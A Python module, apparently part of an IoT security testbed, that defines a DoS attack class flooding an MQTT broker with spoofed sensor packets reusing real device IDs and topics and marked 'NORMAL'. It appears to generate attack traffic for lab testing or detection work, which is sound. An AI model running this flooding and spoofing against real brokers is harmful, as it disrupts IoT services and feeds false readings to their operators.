"""
Denial of Service (DoS) Attack

Purpose:
    Simulates an MQTT flooding attack by rapidly publishing
    legitimate-looking sensor packets.
"""

import random
from datetime import datetime

from backend.attacks.attack_config import (
    DOS_ATTACK_CLIENT,
    DOS_ATTACK_DURATION,
    DOS_PACKET_INTERVAL,
)

from backend.attacks.attack_utils import choose_real_sensor
from backend.attacks.base_attack import BaseAttack


class DoSAttack(BaseAttack):
    """MQTT DoS Attack."""

    def __init__(self):
        super().__init__(
            attack_name="DoS Attack",
            client_id=DOS_ATTACK_CLIENT,
            interval=DOS_PACKET_INTERVAL,
            duration=DOS_ATTACK_DURATION,
        )

        self.packet_count = 0

    def execute(self):
        """Flood the broker with legitimate-looking sensor packets."""

        self.packet_count += 1

        sensor = choose_real_sensor()

        if sensor["sensor_type"] == "temperature":
            value = round(random.uniform(25.0, 35.0), 2)
        else:
            value = round(random.uniform(100.0, 103.0), 2)

        payload = {
            "device_id": sensor["device_id"],
            "timestamp": datetime.now().isoformat(),
            "sensor_type": sensor["sensor_type"],
            "value": value,
            "unit": sensor["unit"],
            "status": "NORMAL",
        }

        self.publisher.publish(
            sensor["topic"],
            payload,
        )

        self.logger.info(
            f"DoS Packet #{self.packet_count} | "
            f"{sensor['sensor_type']}={value} {sensor['unit']} "
            f"→ {sensor['topic']}"
        )


if __name__ == "__main__":
    attack = DoSAttack()

    try:
        attack.start()

    except KeyboardInterrupt:
        attack.stop()